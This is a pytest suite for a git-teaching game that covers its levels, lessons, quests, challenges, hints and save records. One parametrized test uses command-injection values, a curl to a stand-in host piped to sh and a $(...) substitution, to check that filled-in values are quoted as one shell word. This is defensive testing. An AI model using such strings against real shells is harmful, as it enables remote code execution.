import dataclasses
import fcntl
import json
import os
import stat
import subprocess
import threading
import time
from collections.abc import Callable, Sequence
from concurrent.futures import ThreadPoolExecutor
from datetime import date, datetime, timedelta
from pathlib import Path

import pytest
from termlab import sandbox
from termlab.web import terminal

from firstcommit import (
    changes,
    commands,
    demos,
    explanations,
    game,
    gitcmd,
    guide,
    kit,
    markup,
    playground,
    reactions,
    records,
    repomap,
    runner,
    save,
    score,
)
from firstcommit.chapters import BLURBS, CHAPTERS

pytestmark = pytest.mark.usefixtures("sample_decks")

HELLO_BLOB = "ce013625030ba8dba906f756967f9e9ca394464a"


def fake_snapshot(path: Path) -> repomap.Snapshot:
    """
    Stand in for `repomap.snapshot` until it is merged: list the files of a folder.

    Parameters
    ----------
    path : Path
        A folder, which may not exist.

    Returns
    -------
    repomap.Snapshot
        A snapshot whose ``files`` are the folder's top-level names besides ``.git``.
    """
    names = sorted(entry.name for entry in path.iterdir() if entry.name != ".git") if path.is_dir() else []
    files: list[repomap.FileEntry] = [
        {
            "path": name,
            "head": None,
            "index": None,
            "folder": "0" * 40,
            "head_mode": None,
            "index_mode": None,
            "folder_mode": "100644",
            "ignored": False,
            "conflicted": False,
            "repository": False,
            "index_change": None,
            "folder_change": "untracked",
        }
        for name in names
    ]
    return {"exists": path.is_dir(), "bare": False, "head": None, "branch": None, "commits": [], "refs": [], "pushed": [], "files": files, "operation": None, "stash": 0, "truncated": False}


def fake_describe(before: repomap.Snapshot, after: repomap.Snapshot) -> list[changes.Event]:
    """
    Stand in for `changes.describe`: one event per file that appeared.

    Parameters
    ----------
    before : repomap.Snapshot
        The earlier snapshot.
    after : repomap.Snapshot
        The later snapshot.

    Returns
    -------
    list[changes.Event]
        The new files.
    """
    old = {entry["path"] for entry in before["files"]}
    return [{"kind": "file-created", "text": f"`{entry['path']}` appeared."} for entry in after["files"] if entry["path"] not in old]


def fake_frames(slides: Sequence[kit.Slide]) -> list[demos.Frame]:
    """
    Stand in for `demos.frames`: one frame per slide, echoing its run lines.

    Parameters
    ----------
    slides : Sequence[kit.Slide]
        The lesson.

    Returns
    -------
    list[demos.Frame]
        The frames.
    """
    return [
        {"transcript": [{"command": slide.run, "output": f"ran {slide.id}"}], "map": fake_snapshot(Path("/nonexistent")), "objects": [{"hash": "e" * 40, "type": "blob", "size": number}]}
        for number, slide in enumerate(slides)
    ]


@pytest.fixture
def fake_insight(monkeypatch: pytest.MonkeyPatch) -> None:
    """
    Replace the repository readers by the fakes above, where exact made-up figures make a test clearer.

    Parameters
    ----------
    monkeypatch : pytest.MonkeyPatch
        Pytest's patcher.
    """
    monkeypatch.setattr(repomap, "snapshot", fake_snapshot)
    monkeypatch.setattr(changes, "describe", fake_describe)
    monkeypatch.setattr(demos, "frames", fake_frames)


def plain(blocks: list[markup.Block]) -> str:
    """
    Join the text of paragraph blocks, without their markup.

    Parameters
    ----------
    blocks : list[markup.Block]
        Parsed text.

    Returns
    -------
    str
        The text of every span of every paragraph.
    """
    return "".join(span["text"] for block in blocks if block["kind"] == "para" for span in block["spans"])


def lab_project(home: Path) -> Path:
    """
    Give the project folder of the sample level's lab.

    Parameters
    ----------
    home : Path
        The game home.

    Returns
    -------
    Path
        ``<home>/labs/basics-sample/project``.
    """
    return home / "labs" / "basics-sample" / "project"


def lock_is_held(home: Path) -> bool:
    """
    Tell whether the save's lock is held, by trying to take it without waiting.

    Parameters
    ----------
    home : Path
        The game home.

    Returns
    -------
    bool
        True if someone holds the lock; the probe never keeps it.
    """
    with open(home / ".lock", "w") as handle:
        try:
            fcntl.flock(handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError:
            held = True
        else:
            held = False
    return held


def active_record() -> save.Active:
    """
    Read the saved record of the level in progress, which must exist.

    Returns
    -------
    save.Active
        The record.
    """
    active = save.load_active()
    assert active is not None
    return active


def type_lines(home: Path, *typed: tuple[str, int]) -> None:
    """
    Log lines as typed in the game's terminal, as its shell logs them (`firstcommit.commands`).

    Parameters
    ----------
    home : Path
        The game home.
    *typed : tuple[str, int]
        Each line and its exit status, in the order typed.
    """
    log = home / save.COMMANDS_FILE
    count = log.read_bytes().count(b"\0") if log.exists() else 0
    with log.open("ab") as handle:
        for number, (line, status) in enumerate(typed, start=count + 1):
            handle.write(f"{number}\t{status}\t{line}\0".encode())


def solve(level: runner.Level) -> None:
    """
    Play the sample level's reference solution in its lab.

    Parameters
    ----------
    level : runner.Level
        The level in progress.
    """
    level.solve(runner.lab_of(level.id), active_record()["state"], [])


def text_of(blocks: list[markup.Block]) -> str:
    """
    Flatten blocks into their plain text, for assertions.

    Parameters
    ----------
    blocks : list[markup.Block]
        Parsed text.

    Returns
    -------
    str
        The text of every span and code block, joined by spaces.
    """
    parts: list[str] = []
    for block in blocks:
        if block["kind"] == "code":
            parts.append(block["text"])
        elif block["kind"] == "para":
            parts.extend(span["text"] for span in block["spans"])
        else:
            parts.extend(span["text"] for item in block["items"] for span in item)
    return " ".join(parts)


def test_a_new_player_sees_every_chapter_no_xp_and_nothing_in_progress(sample_level: runner.Level) -> None:
    status = game.status()
    assert (status["xp"], status["rank"], status["active"], status["last_payout"], status["cards_due"]) == (0, score.rank(0), None, None, 0)
    assert [(chapter["id"], chapter["title"]) for chapter in status["chapters"]] == list(CHAPTERS.items())
    assert status["max_difficulty"] == max(runner.DIFFICULTIES) == 3
    chapters = {chapter["id"]: chapter for chapter in status["chapters"]}
    basics = chapters["basics"]
    assert basics["levels"] == [
        {"id": "basics-sample", "title": "Say hello", "difficulty": 1, "xp": 100, "command": "git add", "stars": 0, "challenge": False, "done": False, "has_lesson": True, "has_quest": True}
    ]
    assert basics["cards"] == 12
    assert chapters["start"]["levels"] == []


def test_each_chapter_has_its_blurb(sample_level: runner.Level) -> None:
    assert [chapter["blurb"] for chapter in game.status()["chapters"]] == [BLURBS[chapter] for chapter in CHAPTERS]


def test_the_collection_holds_the_card_of_each_finished_level_in_play_order(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    other = dataclasses.replace(sample_level, id="basics-other", card=kit.CommandCard(command="git status", text="Shows the three places."))
    monkeypatch.setattr(runner, "catalogue", lambda: {sample_level.id: sample_level, other.id: other})
    assert game.status()["collection"] == []
    for level in (other, sample_level):
        game.start(level.id)
        solve(level)
        game.check(None, auto=False)
    assert game.status()["collection"] == [
        {"level": "basics-sample", "command": "git add <file>", "text": markup.parse("Copies a file into the staging area.")},
        {"level": "basics-other", "command": "git status", "text": markup.parse("Shows the three places.")},
    ]


def test_a_finished_level_shows_its_best_stars_on_the_map(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    game.hint()
    solve(sample_level)
    game.check(None, auto=False)
    summary = next(chapter for chapter in game.status()["chapters"] if chapter["id"] == "basics")["levels"][0]
    assert (summary["done"], summary["stars"]) == (True, 2)


def test_the_dashboard_shows_the_level_in_progress(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    game.hint()
    active = game.status()["active"]
    assert active is not None
    assert {key: value for key, value in active.items() if key != "started"} == {
        "level": "basics-sample",
        "step": 0,
        "steps": 3,
        "hints": 1,
        "hints_total": 3,
        "attempts": 0,
        "auto_check": False,
        "commands": 0,
        "stars": 2,
        "done": [],
    }


def test_the_page_may_check_automatically_once_the_quest_is_done(sample_level: runner.Level, game_home: Path) -> None:
    assert game.start(sample_level.id)["auto_check"] is False
    game.quest_step(None)
    kit.git(lab_project(game_home), "add", "hello.txt")
    game.quest_step(None)
    assert game.quest_step("trunk")["quest_done"] is True
    active = game.status()["active"]
    assert active is not None and active["auto_check"] is True


def test_the_page_may_check_a_level_without_a_quest_automatically_from_the_start(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    level = dataclasses.replace(sample_level, quest=())
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    assert game.start(level.id)["auto_check"] is True


def test_an_unknown_level_id_raises_unknown_id_error(sample_level: runner.Level) -> None:
    for action in (game.level, game.lesson, game.start, game.see_scene):
        with pytest.raises(game.UnknownIdError, match="basics-nothing"):
            action("basics-nothing")


def test_an_unknown_id_is_a_lookup_error_that_no_key_error_can_pass_for() -> None:
    assert issubclass(game.UnknownIdError, LookupError)
    assert not issubclass(game.UnknownIdError, KeyError)
    assert not issubclass(KeyError, game.UnknownIdError)


def test_a_key_error_inside_a_level_setup_is_a_bug_not_an_unknown_id(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    def broken_setup(lab: kit.Lab) -> kit.State:
        answers: dict[str, str] = {}
        return {"name": answers["players_name"]}

    broken = dataclasses.replace(sample_level, setup=broken_setup)
    monkeypatch.setattr(runner, "catalogue", lambda: {broken.id: broken})
    with pytest.raises(KeyError, match="players_name"):
        game.start(broken.id)


def test_a_key_error_while_building_a_lesson_is_a_bug_not_an_unknown_id(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    def broken_frames(slides: Sequence[kit.Slide]) -> list[demos.Frame]:
        raise KeyError("transcript")

    monkeypatch.setattr(demos, "frames", broken_frames)
    with pytest.raises(KeyError, match="transcript"):
        game.lesson(sample_level.id)


def test_a_key_error_while_scoring_a_card_is_a_bug_not_an_unknown_id(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    def broken_score(level: int, correct: bool, pays: bool, streak: int) -> score.CardScore:
        raise KeyError(level)

    monkeypatch.setattr(score, "card_score", broken_score)
    with pytest.raises(KeyError):
        game.answer_card("basics-c01", "right")


def test_starting_an_unknown_level_leaves_the_level_in_progress_alone(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    with pytest.raises(game.UnknownIdError):
        game.start("basics-nothing")
    assert game.status()["active"] is not None
    assert lab_project(game_home).is_dir()


def test_a_level_page_shows_its_briefing_steps_and_hint_count(sample_level: runner.Level) -> None:
    view = game.level(sample_level.id)
    assert (view["id"], view["chapter"], view["chapter_title"], view["title"], view["difficulty"], view["xp"]) == ("basics-sample", "basics", CHAPTERS["basics"], "Say hello", 1, 100)
    assert (view["hints_total"], view["has_lesson"], view["hints"]) == (3, True, [])
    assert [(step["id"], step["kind"]) for step in view["steps"]] == [("look", "read"), ("stage", "watch"), ("branch", "answer")]
    assert view["steps"][1]["command"] == "git add hello.txt"
    assert view["steps"][2]["placeholder"] == "a branch name"
    assert view["briefing"] == markup.parse(sample_level.briefing)
    assert (view["question"], view["placeholder"], view["debrief"]) == ([], "", None)


def test_a_level_page_shows_its_command_par_scene_and_card(sample_level: runner.Level) -> None:
    view = game.level(sample_level.id)
    assert (view["command"], view["par"], view["scene_seen"]) == ("git add", 3, False)
    assert view["scene"] == [
        {"art": "zones", "text": markup.parse("Three places: the working folder, the staging area and the repository.")},
        {"art": "conveyor", "text": markup.parse("`git add` copies a file into the staging area.")},
    ]
    assert view["card"] == {"level": "basics-sample", "command": "git add <file>", "text": markup.parse("Copies a file into the staging area.")}


def test_a_scene_stays_seen_once_the_player_saw_it_until_a_reset(sample_level: runner.Level) -> None:
    game.see_scene(sample_level.id)
    game.see_scene(sample_level.id)
    assert game.level(sample_level.id)["scene_seen"] is True
    assert save.load_progress()["scenes"] == ["basics-sample"]
    game.reset()
    assert game.level(sample_level.id)["scene_seen"] is False


def test_a_level_solved_by_a_typed_answer_shows_its_question_filled_from_its_state(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    level = dataclasses.replace(sample_level, question="Which branch is `{{branch}}` on?", placeholder="like {{branch}}")
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    view = game.level(level.id)
    assert (view["question"], view["placeholder"]) == (markup.parse("Which branch is `trunk` on?"), "like trunk")


def test_text_of_the_level_in_progress_is_filled_from_its_state(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    view = game.level(sample_level.id)
    assert "trunk" in text_of(view["briefing"])
    assert view["steps"][2]["question"] == markup.parse("Which branch is `trunk`?")
    assert [step["question"] for step in view["steps"][:2]] == [[], []]


@pytest.mark.parametrize(
    ("value", "typed"),
    [("trunk", "git switch trunk"), ("x;curl${IFS}evil.example|sh", "git switch 'x;curl${IFS}evil.example|sh'"), ("$(touch pwned)", "git switch '$(touch pwned)'")],
)
def test_a_value_filled_into_a_step_command_is_one_shell_word(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch, value: str, typed: str) -> None:
    level = dataclasses.replace(sample_level, setup=lambda lab: {"branch": value}, quest=(kit.ReadStep(id="go", text="Switch to `{{branch}}`.", command="git switch {{branch}}"),))
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    (step,) = game.level(level.id)["steps"]
    assert (step["command"], step["text"]) == (typed, markup.parse(f"Switch to `{value}`."))


def test_a_check_message_is_shown_as_written_never_filled_again(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    def tells_untracked(lab: kit.Lab, state: kit.State, answer: str | None, typed: kit.Typed = ()) -> kit.Verdict:
        return kit.Verdict(False, "These files are untracked: `{{expected}}`.")

    secret_step = kit.AnswerStep(id="secret", text="Which?", question="Which?", check=tells_untracked)
    level = dataclasses.replace(sample_level, setup=lambda lab: {"expected": "4f2a9c1d"}, check=tells_untracked, quest=(secret_step,))
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    shown = markup.parse("These files are untracked: `{{expected}}`.")
    assert game.quest_step("x")["message"] == shown
    assert game.check("x", auto=False)["message"] == shown


def test_a_level_page_lists_the_hints_already_revealed(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    game.hint()
    game.hint()
    assert game.level(sample_level.id)["hints"] == [markup.parse(hint) for hint in sample_level.hints[:2]]


@pytest.mark.usefixtures("fake_insight")
def test_a_lesson_gives_each_slide_its_figure(sample_level: runner.Level) -> None:
    lesson = game.lesson(sample_level.id)
    assert (lesson["level"], lesson["title"]) == ("basics-sample", "Say hello")
    first, second = lesson["slides"]
    assert (first["id"], first["title"], first["view"]) == ("init", "A repository", "terminal")
    assert first["text"] == markup.parse(sample_level.lesson[0].text)
    assert first["transcript"] == [{"command": "git init -q demo", "output": "ran init"}]
    assert second["objects"] == [{"hash": "e" * 40, "type": "blob", "size": 1}]
    assert second["map"]["exists"] is False


def test_a_slide_may_show_the_places_of_its_repository(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    level = dataclasses.replace(sample_level, lesson=(kit.Slide(id="init", title="A repository", text="x", run="git init -q", view="places"),))
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    assert game.lesson(level.id)["slides"][0]["view"] == "places"


def test_each_slide_tells_the_change_its_commands_made_as_the_live_feed_would(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    slides = (
        kit.Slide(id="init", title="Init", text="x", run="git init -q", view="places"),
        kit.Slide(id="add", title="Add", text="x", run="echo hi > a.txt\ngit add a.txt", view="places"),
        kit.Slide(id="commit", title="Commit", text="x", run="git commit -q -m First", view="places"),
    )
    level = dataclasses.replace(sample_level, lesson=slides)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    shown = game.lesson(level.id)["slides"]
    assert [[event["kind"] for event in slide["events"]] for slide in shown] == [["repository-created"], ["file-staged", "file-created"], ["commit-created"]]
    assert shown[1]["events"][0]["text"] == markup.parse("`a.txt` was staged as a new file.")


def test_a_slide_and_a_step_carry_their_more_parsed_like_their_text(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    slide = kit.Slide(id="init", title="Init", text="x", run="git init -q", more="Why: `git init` makes `.git`.")
    step = kit.ReadStep(id="look", text="Look.", more="The staging area is the file `.git/index`.")
    level = dataclasses.replace(sample_level, lesson=(slide,), quest=(step,))
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    assert game.lesson(level.id)["slides"][0]["more"] == markup.parse("Why: `git init` makes `.git`.")
    assert game.level(level.id)["steps"][0]["more"] == markup.parse("The staging area is the file `.git/index`.")


def test_a_slide_or_step_without_more_has_nothing_to_fold(sample_level: runner.Level) -> None:
    assert [slide["more"] for slide in game.lesson(sample_level.id)["slides"]] == [[], []]
    assert all(step["more"] == [] for step in game.level(sample_level.id)["steps"])


def test_a_lesson_shows_the_real_commands_their_output_and_the_repository_they_leave(sample_level: runner.Level) -> None:
    first, second = game.lesson(sample_level.id)["slides"]
    assert first["transcript"] == [{"command": "git init -q demo", "output": ""}]
    assert [line["command"] for line in second["transcript"]] == ["cd demo", "printf 'hello\\n' > hello.txt", "git add hello.txt", "git ls-files --stage"]
    assert second["transcript"][-1]["output"] == f"100644 {HELLO_BLOB} 0\thello.txt\n"
    assert (second["view"], second["map"]["branch"]) == ("objects", "main")
    assert [(entry["path"], entry["head"], entry["index"]) for entry in second["map"]["files"]] == [("hello.txt", None, HELLO_BLOB)]
    assert second["objects"] == [{"hash": HELLO_BLOB, "type": "blob", "size": 6}]


@pytest.mark.slow
def test_the_map_guide_shows_each_figure_before_and_after_its_change() -> None:
    figures = game.guide()
    assert list(figures) == [figure.section for figure in guide.FIGURES]
    for figure in guide.FIGURES:
        view = figures[figure.section]
        assert view["before"]["exists"] and view["after"] != view["before"], figure.section
        assert [line["command"] for line in view["transcript"]] == [line for line in figure.change.split("\n") if line.strip()]
    json.dumps(figures)


def test_starting_a_level_builds_its_lab_and_records_it(sample_level: runner.Level, game_home: Path) -> None:
    view = game.start(sample_level.id)
    assert (view["level"], view["step"], view["steps"], view["hints"], view["hints_total"], view["attempts"]) == ("basics-sample", 0, 3, 0, 3, 0)
    assert datetime.fromisoformat(view["started"]).tzinfo is not None
    assert (lab_project(game_home) / "hello.txt").exists()
    assert save.load_active() == {"level": "basics-sample", "started": view["started"], "step": 0, "hints": 0, "attempts": 0, "state": {"branch": "trunk"}, "log_offset": 0, "typed": [], "events": [], "done": []}


def test_starting_again_ends_the_level_in_progress_with_a_fresh_lab(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.hint()
    (lab_project(game_home) / "scribble.txt").write_text("x")
    view = game.start(sample_level.id)
    assert view["hints"] == 0
    assert not (lab_project(game_home) / "scribble.txt").exists()


def test_starting_a_level_gives_the_game_its_base_git_config_once(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    assert (game_home / "gitconfig").read_text() == gitcmd.BASE_CONFIG
    (game_home / "gitconfig").write_text("[user]\n\tname = Ada\n")
    game.start(sample_level.id)
    assert (game_home / "gitconfig").read_text() == "[user]\n\tname = Ada\n"


def test_a_level_whose_setup_fails_leaves_nothing_in_progress(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    def broken_setup(lab: kit.Lab) -> kit.State:
        raise RuntimeError("setup broke")

    broken = dataclasses.replace(sample_level, setup=broken_setup)
    monkeypatch.setattr(runner, "catalogue", lambda: {broken.id: broken})
    with pytest.raises(RuntimeError):
        game.start(broken.id)
    assert save.load_active() is None
    assert not (game_home / "labs" / "basics-sample").exists()


@pytest.mark.parametrize("action", [lambda: game.quest_step(None), lambda: game.check(None, auto=True), game.hint, game.observe, lambda: game.press("you", "status")])
def test_actions_on_a_level_need_a_level_in_progress(sample_level: runner.Level, action: Callable[[], object]) -> None:
    with pytest.raises(game.NotPlayingError):
        action()


@pytest.mark.parametrize(("field", "value", "action"), [("hints", 4, game.hint), ("step", 4, lambda: game.quest_step(None)), ("hints", 9, lambda: game.check(None, auto=False))])
def test_an_active_record_beyond_its_level_is_a_damaged_save(sample_level: runner.Level, game_home: Path, field: str, value: int, action: Callable[[], object]) -> None:
    game.start(sample_level.id)
    (game_home / "active.json").write_text(json.dumps({**active_record(), field: value}))
    with pytest.raises(save.SaveError, match=rf"active\.json.*`{field}`"):
        action()


def test_an_active_record_at_its_levels_limits_is_fine(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    save.write_active({**active_record(), "hints": 3, "step": 3, "done": ["look", "stage", "branch"]})
    assert game.hint()["used"] == 3
    assert game.quest_step(None)["quest_done"] is True


def test_a_level_in_progress_that_no_longer_exists_counts_as_none(sample_level: runner.Level) -> None:
    save.write_active({"level": "basics-gone", "started": "2026-10-06T10:00:00+00:00", "step": 0, "hints": 0, "attempts": 0, "state": {}, "log_offset": 0, "typed": [], "events": [], "done": []})
    assert game.status()["active"] is None
    with pytest.raises(game.NotPlayingError):
        game.check(None, auto=False)


def test_a_read_step_passes_whatever_is_typed(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    assert game.quest_step("anything") == {"correct": True, "message": [], "step": 1, "quest_done": False, "done": ["look"]}


def test_a_watch_step_passes_once_the_lab_shows_it_was_done(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.quest_step(None)
    waiting = game.quest_step(None)
    assert (waiting["correct"], waiting["step"], text_of(waiting["message"])) == (False, 1, "Not staged yet.")
    kit.git(lab_project(game_home), "add", "hello.txt")
    assert game.quest_step(None)["step"] == 2


def test_the_quest_checks_only_the_current_step(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    game.quest_step(None)
    assert game.quest_step("trunk")["step"] == 1


def test_an_answer_step_needs_the_right_answer(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.quest_step(None)
    kit.git(lab_project(game_home), "add", "hello.txt")
    game.quest_step(None)
    wrong = game.quest_step("main")
    assert (wrong["correct"], wrong["step"], wrong["quest_done"]) == (False, 2, False)
    assert wrong["message"] == markup.parse("Look at the first line of `git status`.")
    assert game.quest_step(None)["correct"] is False
    assert game.quest_step(" trunk ") == {"correct": True, "message": markup.parse("Right."), "step": 3, "quest_done": True, "done": ["look", "stage", "branch"]}


def with_prediction(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> runner.Level:
    """
    Make the catalogue hold the sample level with a prediction before its quest.

    Parameters
    ----------
    sample_level : runner.Level
        The sample level.
    monkeypatch : pytest.MonkeyPatch
        Pytest's patcher.

    Returns
    -------
    runner.Level
        The level.
    """
    guess = kit.ChoiceStep(id="guess", text="Guess first.", question="Does `git add` change the last commit?", options=("Yes", "No"), reveal="No: it only fills the staging area.")
    level = dataclasses.replace(sample_level, quest=(guess, *sample_level.quest))
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    return level


def test_a_prediction_shows_its_question_and_options_and_any_option_passes_with_its_reveal(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    level = with_prediction(sample_level, monkeypatch)
    step = game.level(level.id)["steps"][0]
    assert (step["kind"], step["question"], step["placeholder"]) == ("choice", markup.parse("Does `git add` change the last commit?"), "")
    assert step["choices"] == [{"value": "Yes", "text": markup.parse("Yes")}, {"value": "No", "text": markup.parse("No")}]
    game.start(level.id)
    refused = game.quest_step("Perhaps")
    assert (refused["correct"], refused["step"]) == (False, 0)
    passed = game.quest_step("Yes")
    assert (passed["correct"], passed["message"], passed["step"]) == (True, markup.parse("No: it only fills the staging area."), 1)
    assert active_record()["attempts"] == 0


def test_steps_other_than_a_prediction_offer_no_choices(sample_level: runner.Level) -> None:
    assert [step["choices"] for step in game.level(sample_level.id)["steps"]] == [[], [], []]


def committed(lab: kit.Lab, state: kit.State, typed: kit.Typed) -> kit.Verdict:
    """
    Pass once the branch has a commit, as a challenge goal reads an end state.

    Parameters
    ----------
    lab : kit.Lab
        The lab.
    state : kit.State
        The level state.
    typed : kit.Typed
        Unused.

    Returns
    -------
    kit.Verdict
        Whether a commit exists.
    """
    done = kit.git_run(lab.project, "rev-parse", "-q", "--verify", "HEAD").returncode == 0
    return kit.Verdict(done, "A commit exists." if done else "No commit yet.")


def as_challenge(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> runner.Level:
    """
    Make the catalogue hold the sample level as a challenge with two goals: something staged, and a commit.

    Parameters
    ----------
    sample_level : runner.Level
        The sample level.
    monkeypatch : pytest.MonkeyPatch
        Pytest's patcher.

    Returns
    -------
    runner.Level
        The challenge.
    """
    stage = next(step for step in sample_level.quest if step.id == "stage")
    goals = (kit.WatchStep(id="commit", text="A commit exists.", watch=committed), stage)
    level = dataclasses.replace(sample_level, challenge=True, quest=goals)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    return level


def test_a_challenges_goals_tick_in_any_order(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = as_challenge(sample_level, monkeypatch)
    game.start(level.id)
    kit.git(lab_project(game_home), "add", "hello.txt")
    first = game.quest_step(None)
    assert (first["correct"], first["done"], first["step"], first["quest_done"]) == (True, ["stage"], 1, False)
    assert first["message"] == markup.parse("No commit yet.")
    kit.git(lab_project(game_home), "commit", "-q", "-m", "Say hello")
    second = game.quest_step(None)
    assert (second["correct"], second["done"], second["quest_done"]) == (True, ["commit", "stage"], True)
    active = game.status()["active"]
    assert active is not None and (active["done"], active["auto_check"]) == (["commit", "stage"], True)


def test_a_challenges_goal_stays_ticked_and_nothing_new_is_not_a_pass(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = as_challenge(sample_level, monkeypatch)
    game.start(level.id)
    kit.git(lab_project(game_home), "add", "hello.txt")
    game.quest_step(None)
    kit.git(lab_project(game_home), "rm", "-q", "--cached", "hello.txt")
    again = game.quest_step(None)
    assert (again["correct"], again["done"]) == (False, ["stage"])


def test_an_ordered_quest_reports_the_goals_met_so_far(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    assert game.quest_step(None)["done"] == ["look"]
    active = game.status()["active"]
    assert active is not None and active["done"] == ["look"]


def test_a_challenge_is_flagged_and_its_card_stays_hidden_until_solved(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = as_challenge(sample_level, monkeypatch)
    view = game.level(level.id)
    assert (view["challenge"], view["card"]) == (True, None)
    summary = next(chapter for chapter in game.status()["chapters"] if chapter["id"] == level.chapter)["levels"][0]
    assert summary["challenge"] is True
    game.start(level.id)
    solve(level)
    assert game.check(None, auto=False)["new_card"] is not None
    assert game.level(level.id)["card"] == {"level": level.id, "command": "git add <file>", "text": markup.parse("Copies a file into the staging area.")}


def test_a_level_that_is_not_a_challenge_shows_its_card_and_no_flag(sample_level: runner.Level) -> None:
    view = game.level(sample_level.id)
    assert view["challenge"] is False and view["card"] is not None


def test_in_a_challenge_rama_speaks_only_of_danger_and_errors(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = as_challenge(sample_level, monkeypatch)
    game.start(level.id)
    game.observe()
    kit.git(lab_project(game_home), "add", "hello.txt")
    type_lines(game_home, ("ls", 0), ("git add hello.txt", 0), ("gti status", 127))
    reactions_seen = game.observe()["reactions"]
    assert [(reaction["line"], reaction["mood"]) for reaction in reactions_seen] == [("gti status", "err")]
    assert reactions_seen[0]["text"] == markup.parse(reactions.UNKNOWN_COMMAND)


def test_a_finished_quest_checks_nothing_more(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    save.write_active({**active_record(), "step": 3, "done": ["look", "stage", "branch"]})
    assert game.quest_step("trunk") == {"correct": False, "message": [], "step": 3, "quest_done": True, "done": ["look", "stage", "branch"]}


def test_quest_steps_never_count_as_attempts(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    game.quest_step(None)
    game.quest_step("x")
    assert active_record()["attempts"] == 0


def test_a_check_the_player_asks_for_counts_as_an_attempt_and_an_automatic_one_does_not(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    result = game.check(None, auto=False)
    assert (result["solved"], result["payout"], result["debrief"]) == (False, None, None)
    assert result["message"] == markup.parse("`hello.txt` is not in a commit yet.")
    game.check("x", auto=False)
    game.check(None, auto=True)
    assert active_record()["attempts"] == 2


def counting(level: runner.Level, calls: list[str | None]) -> runner.Level:
    """
    Wrap a level's check so a test can count the times it runs.

    Parameters
    ----------
    level : runner.Level
        The level.
    calls : list[str | None]
        Gets the answer of every call.

    Returns
    -------
    runner.Level
        The level with the counting check.
    """

    def check(lab: kit.Lab, state: kit.State, answer: str | None, typed: kit.Typed) -> kit.Verdict:
        calls.append(answer)
        return level.check(lab, state, answer, typed)

    return dataclasses.replace(level, check=check)


def test_an_automatic_check_never_ends_a_level_before_its_quest_is_done(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str | None] = []
    level = counting(sample_level, calls)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    solve(level)
    game.quest_step(None)
    result = game.check(None, auto=True)
    assert (result["solved"], result["payout"], result["debrief"]) == (False, None, None)
    assert "step 2 of 3" in text_of(result["message"])
    assert (calls, active_record()["attempts"], save.load_progress()["xp"]) == ([None], 0, 0)


def test_once_the_quest_is_done_the_automatic_check_ends_the_level(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    game.quest_step(None)
    kit.git(lab_project(game_home), "add", "hello.txt")
    game.quest_step(None)
    assert game.quest_step("trunk")["quest_done"] is True
    assert game.check(None, auto=True)["solved"] is False
    kit.git(lab_project(game_home), "commit", "-q", "-m", "Say hello")
    assert game.check(None, auto=True)["solved"] is True


def test_an_automatic_check_of_a_level_without_a_quest_checks_the_level(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str | None] = []
    level = counting(dataclasses.replace(sample_level, quest=()), calls)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    assert game.check(None, auto=True)["message"] == markup.parse("`hello.txt` is not in a commit yet.")
    solve(level)
    assert game.check(None, auto=True)["solved"] is True
    assert calls == [None, None]


def test_a_blank_answer_counts_as_no_answer(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[str | None] = []

